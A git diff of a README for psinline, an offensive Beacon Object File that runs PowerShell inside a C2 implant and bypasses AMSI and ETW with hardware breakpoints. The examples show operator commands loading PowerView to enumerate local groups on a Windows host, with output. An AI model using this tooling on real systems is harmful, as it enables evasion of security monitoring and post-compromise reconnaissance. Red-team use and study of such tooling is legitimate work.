@@ -12,9 +12,11 @@ Takes as input the following parameters:
 
 The BOF concatenates your powershell command to the powershell script, base64 encode the concatenation and pass the base64 blob as arguments to PS.exe that executes it. It uses hardware breakpoints for AMSI/ETW bypass.
 
-## How to run
+## Examples
 
-Run the following commands in your badger:
+### Run cmdlet from PowerView
+
+First use coff_args to set PowerView.ps1 as powershell script to load and then use coffexec to execute Get-NetLocalGroup:
 ```
 => set_coffargs /home/kali/CLionProjects/psinline/PS.exe /home/kali/CLionProjects/psinline/PowerView.ps1
 
@@ -23,7 +25,6 @@ Run the following commands in your badger:
 [*] CoffExec Arguments Updated
 +-------------------------------------------------------------------+
 => coffexec /home/kali/CLionProjects/psinline/psinline.x64.o Get-NetLocalGroup
-[*] Task-0 [Thread: 7844]
 
 [*] Coffexec Output:
 
@@ -58,7 +59,7 @@ DESKTOP-URP43TK Users                               Users are prevented from mak
 [+] psinline Finished
 
 +-------------------------------------------------------------------+
-2023/09/25 13:52:33 CEST [input] admin => coffexec /home/kali/CLionProjects/psinline/psinline.x64.o Get-NetLocalGroup | fl *
+=> coffexec /home/kali/CLionProjects/psinline/psinline.x64.o Get-NetLocalGroup | fl *
 
 2023/09/25 13:52:35 CEST [sent 41592 bytes]
 
@@ -87,9 +88,44 @@ Comment      : Administrators have complete and unrestricted access to the compu
 
 ![image](https://github.com/MrAle98/psinline/assets/74059030/29b96742-c21f-43df-a2a7-a310ca0b7c66)
 
+### Run generic powershell command
+
+Set script to import a dummy powershell script and then run ls command with coffexec:
+```
+=> set_coffargs /home/kali/CLionProjects/psinline/PS.exe /home/kali/CLionProjects/psinline/dummy.ps1 
+
+2023/09/25 14:28:26 CEST [sent 17032 bytes]
+
+[*] CoffExec Arguments Updated
++-------------------------------------------------------------------+
+=> coffexec /home/kali/CLionProjects/psinline/psinline.x64.o ls
+[*] Coffexec Output:
+
+[*] Using .NET version v4.0.30319
+
+
+
+    Directory: C:\temp\inceptor\inceptor\inceptor
+
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+d-----         5/23/2023  12:07 AM                artifacts                                                             
+d-----         5/23/2023  12:07 AM                certs                                                                 
+d-----         6/11/2023   9:14 AM                compilers                                                             
+d-----          6/2/2023   5:00 PM                config                                                                
+d-----          6/2/2023   5:00 PM                converters                                                            
+d-----          6/2/2023   5:00 PM                demo
+[...]
+
+[+] psinline Finished
+```
+
+![image](https://github.com/MrAle98/psinline/assets/74059030/39521fbc-a5e9-4b8e-afae-740001525c13)
+
 ## Notes
 
-Everytime you launch psinline, wait for it to finish before launching it again. Having to threads running psinline at same time will break things and kill your process.
+Everytime you launch psinline, **wait for it to finish before launching it again**. Having **two threads running psinline at same time will break things and kill your process**.
 
 ## Credits
 - [@C5pider](https://github.com/Cracked5pider)
